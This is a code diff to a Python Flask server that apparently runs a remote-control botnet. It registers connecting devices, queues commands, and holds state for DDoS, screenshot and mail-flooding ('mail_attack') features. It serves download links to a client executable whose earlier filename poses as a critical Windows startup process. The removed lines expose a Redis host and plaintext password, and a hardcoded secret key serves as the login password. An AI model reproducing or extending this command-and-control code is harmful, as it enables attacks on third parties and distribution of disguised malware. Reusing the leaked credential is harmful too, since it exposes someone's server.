@@ -3,16 +3,13 @@ import json
 import os
 import time
 
-import redis_server
-
 version = 5
-download_address = "http://cloudcdn.yixiangzhilv.com/uploads/2021/05/17/3IbF1NNd_Windows%E7%B3%BB%E7%BB%9F%E5%85%B3%E9%94%AE%E5%90%AF%E5%8A%A8%E8%BF%9B%E7%A8%8B-5.exe"
+download_address = "http://rbsi.yxzl.top:5001/static/RBSI-5.exe"
 
 thisDir = os.path.dirname(os.path.abspath(__file__))
 app = Flask(__name__)
-app.secret_key = "RBSI-"
+app.secret_key = "-RBSI-"
 password = app.secret_key
-redis = redis_server.RedisServer("yxzlaliyunserveraddress.yixiangzhilv.com", 6379, "@Danny20070601")
 connects = {}
 not_connect = {}
 commands = []
@@ -21,8 +18,16 @@ ddos = {"set-time": time.time()}
 screenshot = 0
 stop = {"once": [], "forever": []}
 show_version = []
-another_name = {}
 messages = {}
+
+
+def get_another_name():
+    names = {}
+    for root, dirs, files in os.walk(thisDir + "/names", topdown=False):
+        for name in files:
+            with open(os.path.join(root, name), "r", encoding="utf-8") as f:
+                names[name] = f.read()
+    return names
 
 
 def format_time():
@@ -47,7 +52,7 @@ def index():
             not_connect[i] = j
     connects = _connects
     return render_template("index.html", connects=connects, not_connect=not_connect,
-                           another_name=another_name,count=count,
+                           another_name=get_another_name(), count=count,
                            version=version, download_address=download_address,
                            time=time.time, round=round)
 
@@ -63,12 +68,11 @@ def upload():
 @app.route("/init", methods=["POST"])
 def start():
     if not_connect.get(request.form.get("name")):
-        del(not_connect[request.form.get("name")])
+        del (not_connect[request.form.get("name")])
     connects[request.form.get("name")] = time.time()
     if not messages.get(request.form.get("name")):
         messages[request.form.get("name")] = []
     print("新的设备（%s）成功连接到服务器" % request.form.get("name"))
-    another_name[request.form.get("name")] = redis.get("site:RUI:computer:%s" % request.form.get("name")) or "(None)"
     result = {"action": len(commands), "version": version, "download_address": download_address}
     return json.dumps(result)
 
@@ -76,15 +80,16 @@ def start():
 @app.route("/set-another-name", methods=["POST"])
 def set_another_name():
     name = request.form.get("name").replace("\t", "")
-    redis.set("site:RUI:computer:%s" % name, request.form.get("another_name"))
-    another_name[name] = redis.get("site:RUI:computer:%s" % name) or "(None)"
+    with open("%s/names/%s" % (thisDir, name), "w", encoding="utf-8") as f:
+        f.write(request.form.get("another_name"))
     return redirect("/")
 
 
 @app.route("/message", methods=["GET", "POST"])
 def message():
     if request.method == "POST":
-        messages[request.form.get("name")] = [format_time() + "&emsp;&emsp;" + request.form.get("message")] + messages[request.form.get("name")]
+        messages[request.form.get("name")] = [format_time() + "&emsp;&emsp;" + request.form.get("message")] + messages[
+            request.form.get("name")]
         messages[request.form.get("name")] = messages[request.form.get("name")][:50]
         return "Success"
     else:
@@ -159,7 +164,7 @@ def sub_mail_attack():
     mail_attack = request.form.to_dict().copy()
     mail_attack["times"] = int(mail_attack["times"])
     mail_attack["set-time"] = time.time()
-    if request.form.get("title") or request.form.get("content") or\
+    if request.form.get("title") or request.form.get("content") or \
             request.form.get("from-name"):
         mail_attack["easy"] = False
     else:
@@ -221,8 +226,13 @@ def check_network():
 
 
 @app.route("/d")
-def get_download_address():
+def get_download():
     return redirect(download_address)
+
+
+@app.route("/download")
+def get_download_address():
+    return "https://free-cn-01.host.bilnn.com/get/yxzlimage/RBSI-5.exe"
 
 
 if __name__ == "__main__":
